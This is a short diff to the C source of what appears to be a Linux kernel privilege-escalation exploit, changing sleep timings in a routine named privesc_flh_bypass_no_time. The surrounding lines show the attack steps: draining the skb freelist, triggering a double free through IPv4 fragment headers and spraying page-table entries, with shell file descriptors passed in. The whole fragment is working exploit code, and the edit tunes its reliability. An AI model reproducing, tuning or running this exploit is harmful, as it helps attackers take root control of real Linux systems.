@@ -308,7 +308,7 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 
 	// pop N skbs from skb freelist
 	alloc_ipv4_udp(1);
-	sleep(3);
+	sleep(2);
 
 	// allocate and free 1 skb from freelist
 	df_ip_header.ip_id = 0x1337;
@@ -316,8 +316,9 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 	df_ip_header.ip_off = ntohs((0 >> 3) | 0x2000);  // wait for other fragments. 8 >> 3 to make it wait or so?
 	trigger_double_free_hdr(32768 + 8, &df_ip_header);
 	
-	sleep(3);
+	sleep(2);
 	recv_ipv4_udp(1);
+	sleep(2);
 
 	// spray-allocate the PTEs from PCP allocator order-0 list
 	printf("[*] spraying %d pte's...\n", CONFIG_PTE_SPRAY_AMOUNT);
